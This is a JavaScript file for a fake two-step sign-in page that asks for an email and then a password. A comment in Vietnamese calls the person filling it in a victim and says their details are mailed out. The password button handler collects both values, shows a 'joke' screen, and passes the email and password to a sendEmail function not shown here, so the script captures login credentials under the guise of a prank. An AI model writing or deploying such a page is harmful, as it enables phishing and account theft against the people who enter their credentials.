const formGroups = document.querySelectorAll('.form-group')
const inputs = document.querySelectorAll('.form-control')
const labels = document.querySelectorAll('.form-group .label')

const progressBar = document.querySelector('.progress-bar')
const progress = document.querySelector('.progress')

const inputEmail = document.querySelector('#input-email')
const btnNextEmail = document.querySelector('#nextEmail')
const txtEmail = document.querySelector('#txtEmail')

const inputPass = document.querySelector('#input-pass')
const btnNextPass = document.querySelector('#nextPass')
const txtPass = document.querySelector('#txtPass')
const backBtn = document.querySelector('.back i')

//Handler Event
backBtn.addEventListener('click', () => {
    progressBar.style.visibility = 'visible'
    progress.style.animation = 'progress 0.8s ease infinite';
    setTimeout(() => {
        inputPass.style.animation = 'floatRight 0.5s forwards'
        inputEmail.aminationDelay = '0.5s'
        inputEmail.style.animation = 'floatMain 0.5s forwards'
        checkInput()
        progressBar.style.visibility = 'hidden'
        progress.style.animation = '';

    }, 3000)
})
btnNextEmail.addEventListener('click', () => {
    progressBar.style.visibility = 'visible'
    progress.style.animation = 'progress 0.8s ease infinite';
    setTimeout(() => {
        inputEmail.style.animation = 'floatLeft 0.5s forwards'
        inputPass.style.animationDelay = '0.5s'
        inputPass.style.animation = 'floatMain 0.5s forwards'
        checkInput()
        inputPass.querySelector('.email-address span').innerHTML = inputEmail.querySelector('.form-control').value
        progressBar.style.visibility = 'hidden'
        progress.style.animation = '';

    }, 3000)

})
//Hien o troll va gui mail cho nan nhan
btnNextPass.addEventListener('click', () => {
    var email = txtEmail.value;
    var password = txtPass.value
    var password = txtPass.value;
    showJoke()
    sendEmail(email,password);
})
document.querySelector('#show-pass').addEventListener('change', function () {
    txtPass.type = this.checked ? 'text' : 'password';
})
//Check input rong
function checkInput() {
    inputs.forEach(input => {
        input.value === "" ? input.previousElementSibling.classList.add('blank')
            : input.previousElementSibling.classList.remove('blank')
    })
    // input.value === "" ? label.classList.add('blank') : label.classList.remove('blank')
}
document.addEventListener('click', (e) => {
    formGroups.forEach(formGroup => {
        if (e.target.isSameNode(formGroup) || e.target.isSameNode(formGroup.querySelector('.form-control'))
            || e.target.isSameNode(formGroup.querySelector('.label'))) {
            formGroup.classList.add('focus')
            formGroup.querySelector('input').focus()
            checkInput()
        }
        else {
            formGroup.classList.remove('focus')
            checkInput()
        }
    })
})
//init
checkInput()
